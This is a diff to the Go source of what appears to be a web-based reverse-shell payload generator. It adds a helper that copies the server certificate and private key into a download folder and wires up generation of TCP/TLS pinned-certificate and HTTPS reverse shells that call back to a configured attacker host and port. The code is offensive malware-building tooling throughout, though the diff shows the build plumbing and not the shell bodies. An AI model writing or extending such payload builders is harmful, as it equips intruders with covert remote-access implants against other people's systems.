@@ -349,7 +349,36 @@ func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcef
 	}
 }
 
-func createrevgoshell(revshellfilepath, outfilepath, port string) {
+func copyfile(sourcepath, destpath string) {
+	srcpubkfile, err := os.Open(sourcepath)
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer srcpubkfile.Close()
+	newpubkFile, err := os.Create(destpath)
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer newpubkFile.Close()
+
+	scanner := bufio.NewScanner(srcpubkfile)
+	for scanner.Scan() {
+		str := scanner.Text()
+
+		newpubkFile.WriteString(str + "\n")
+	}
+
+	if err = scanner.Err(); err != nil {
+		log.Fatal(err)
+	}
+}
+
+func createrevgoshell(revshellfilepath, outfilepath, port string, copycerts bool) {
+	if copycerts {
+		copyfile("manager/server.crt", "download/server.crt")
+		copyfile("manager/server.key", "download/server.key")
+	}
+
 	file, err := os.Open(revshellfilepath)
 	if err != nil {
 		log.Fatal(err)
@@ -550,15 +579,17 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				basepath = filepath.FromSlash("basefiles/gorevcmd.go")
 				outpath = filepath.FromSlash("outfiles/gorevcmd.go")
 				exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
-				createrevgoshell("manager/tcprev.go", "outfiles/tcprev.go", rport)
+				createrevgoshell("manager/tcprev.go", "outfiles/tcprev.go", rport, false)
 			} else if shelltype == "TCP/TLS(PinnedCert)" {
 				basepath = filepath.FromSlash("basefiles/mask.go")
 				outpath = filepath.FromSlash("outfiles/mask.go")
 				exeoutpath = filepath.FromSlash("outfiles/mask.go")
+				createrevgoshell("manager/tcptlsrev.go", "outfiles/tcptlsrev.go", rport, true)
 			} else if shelltype == "HTTPS" {
 				basepath = filepath.FromSlash("basefiles/shadow.go")
 				outpath = filepath.FromSlash("outfiles/shadow.go")
 				exeoutpath = filepath.FromSlash("outfiles/shadow.go")
+				createrevgoshell("manager/httpsrev.go", "outfiles/httpsrev.go", rport, true)
 			}
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
 
